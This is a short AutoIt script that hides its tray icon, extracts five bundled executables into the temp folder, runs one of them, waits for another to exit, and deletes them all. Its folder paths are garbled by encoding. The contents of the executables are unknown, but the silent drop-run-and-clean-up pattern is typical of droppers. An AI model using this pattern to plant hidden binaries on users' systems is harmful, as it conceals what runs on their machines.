#NoTrayIcon
HotKeySet("{F1}", "Terminate")

FileInstall("D:\�½��ļ���\��\ɾ��ͼƬ\228.exe", @TempDir & "\",1)
FileInstall("D:\�½��ļ���\��\ɾ��ͼƬ\252.exe", @TempDir & "\",1)
FileInstall("D:\�½��ļ���\��\ɾ��ͼƬ\208.exe", @TempDir & "\",1)
FileInstall("D:\�½��ļ���\��\ɾ��ͼƬ\204.exe", @TempDir & "\",1)
FileInstall("D:\�½��ļ���\��\ɾ��ͼƬ\206.exe", @TempDir & "\",1)
ShellExecute ( "228.exe" , "����" , @TempDir & "\" )

ProcessWait("206.exe")
ProcessWaitClose ("206.exe")
FileDelete(@TempDir & "\228.exe")
FileDelete(@TempDir & "\252.exe")
FileDelete(@TempDir & "\208.exe")
FileDelete(@TempDir & "\204.exe")
FileDelete(@TempDir & "\206.exe")

Func Terminate()
    Exit 0
EndFunc